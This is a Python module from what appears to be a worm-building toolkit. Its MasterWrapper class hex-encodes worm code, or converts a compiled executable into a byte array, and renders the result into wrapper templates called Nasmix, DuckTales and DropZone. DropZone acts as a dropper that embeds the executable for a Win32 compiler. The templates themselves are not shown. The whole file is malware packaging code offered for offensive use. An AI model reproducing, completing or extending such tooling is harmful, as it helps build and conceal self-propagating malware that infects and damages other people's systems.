import base64
from jinja2 import Template

from typing import Union

class MasterWrapper:
    def __init__(self, coder: object):
        self.name = "MasterWrapper"
        self.coder = coder
        self.msg = self.coder.msg
        
    

    def nasm_wrapper(self, wrapper_code: str, worm_code: str, var: dict = {}) -> str:
        self.msg("msg", "Use 'nasm wrapper'")
        raw = Template(wrapper_code)
        wcode = worm_code.replace('"', "'")
        scode = ""
        for line in wcode.split("\n"):
            if line == "":
                continue
            scode += f'"{line}",10,'
        scode += "0"
        data = {"WORM_FINAL_CODE" : scode}
        raw = raw.render(data)
        return raw
    
    
    def nasmix_wrapper(self, worm_pipeline: object, wrapper: object) -> object:
        wrap = Template(wrapper.raw_code)
        code = worm_pipeline.code.encode("utf-8").hex()
        worm_pipeline.var["WORM_FINAL_CODE"] = code
        wrap = wrap.render(worm_pipeline.var)
        worm_pipeline.code = wrap
        return worm_pipeline
    
    def duck_tales(self, worm_pipeline: object, wrapper: object) -> object:
        wrap = Template(wrapper.raw_code)
        code = worm_pipeline.code.encode().hex()
        worm_pipeline.var["WORM_FINAL_CODE"] = code
        worm_pipeline.var["CODE_LEN"] = len(code) + 23
        wrap = wrap.render(worm_pipeline.var)
        worm_pipeline.code = wrap
        return worm_pipeline
    
    def drop_zone(self, worm_pipeline: object, wrapper: object) -> object:
        worm_pipeline.last_error = 0
        try:
            with open(worm_pipeline.exe_file_path, "rb") as file:
                bin_data = file.read()
        except Exception as e:
            self.msg("error", f"[!!] ERROR: Cant open executable file: '{e}' [!!]", sender=self.name)
            worm_pipeline.last_error = 1
            return worm_pipeline
        data = ""
        for i, byte in enumerate(bin_data):
            data += f"0x{byte:02X}"
            if i != len(bin_data) - 1:
                data += ", "
        worm_pipeline.var["WORM_FINAL_CODE"] = data
        worm_pipeline.var["CODE_LEN"] = len(bin_data)
        wrap = Template(wrapper.raw_code)
        wrap = wrap.render(worm_pipeline.var)
        worm_pipeline.code = wrap
        worm_pipeline.gvar["COMPILER_NAME"] = "MC_win32"
        return worm_pipeline
    

    
    def wrap_worm(self, worm_pipeline: object, wrapper: object) -> object:
        match wrapper.name:
            case "Nasmix":
                worm_pipeline = self.nasmix_wrapper(worm_pipeline, wrapper)
            case "DuckTales":
                worm_pipeline = self.duck_tales(worm_pipeline, wrapper)
            case "DropZone":
                worm_pipeline = self.drop_zone(worm_pipeline, wrapper)
            case _:
                self.msg("error", f"ERROR: wrapper: '{wrapper.name}' does not exists")

        return worm_pipeline
